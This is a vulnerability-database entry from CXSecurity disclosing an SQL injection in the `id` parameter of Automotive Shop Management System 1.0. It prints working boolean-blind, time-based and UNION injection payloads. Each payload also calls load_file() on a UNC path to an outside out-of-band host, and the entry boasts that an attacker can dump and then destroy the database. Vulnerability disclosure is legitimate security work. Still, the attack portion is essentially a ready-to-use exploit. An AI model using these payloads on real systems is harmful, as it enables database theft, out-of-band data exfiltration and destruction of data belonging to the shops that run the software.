---
title: Automotive Shop Management System 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2022120008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-06
fetch_date: 2025-10-04T00:33:21.742918
---

# Automotive Shop Management System 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Automotive Shop Management System 1.0 SQL Injection** **2022.12.05**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

## Title: ASMS - PHP (by: oretnom23 ) v1.0 SQLi
## Author: nu11secur1ty
## Date: 12.03.2022
## Vendor: https://github.com/oretnom23,
https://www.sourcecodester.com/users/tips23
## Software: https://www.sourcecodester.com/download-code?nid=15312&title=Automotive+Shop+Management+System+in+PHP%2FOOP+Free+Source+Code
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/2022/ASMS-1.0
## Description:
The `id` parameter appears to be vulnerable to SQL injection attacks.
The attacker can dump all database information without any problems,
and then he can destroy this system, it is depending
from the scenario.
## STATUS: Critically awful
[+] Payload:
```MySQL
---
Parameter: id (GET)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
Payload: id=7'+(select
load\_file('\\\\q3ui0l0datyx3tg6cov4tj0tpkvdj69u0xoobez3.stupid.com\\aze'))+''
OR NOT 9828=9828 AND 'NWsG'='NWsG
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: id=7'+(select
load\_file('\\\\q3ui0l0datyx3tg6cov4tj0tpkvdj69u0xoobez3.stupid.com\\aze'))+''
AND (SELECT 9682 FROM (SELECT(SLEEP(5)))Oifb) AND 'zARc'='zARc
Type: UNION query
Title: MySQL UNION query (NULL) - 8 columns
Payload: id=7'+(select
load\_file('\\\\q3ui0l0datyx3tg6cov4tj0tpkvdj69u0xoobez3.stupid.com\\aze'))+''
UNION ALL SELECT
NULL,CONCAT(0x7176626271,0x71504455436c68624e7878795354674d76627a4b4164756a4c46537651584b67584d744963504b5a,0x716a6b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
---
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/2022/ASMS-1.0)
## Proof and Exploit:
[href](https://streamable.com/c5v75u)
## Time spent
`00:27:00`
## Time attack
`00:01:57`

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120008)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top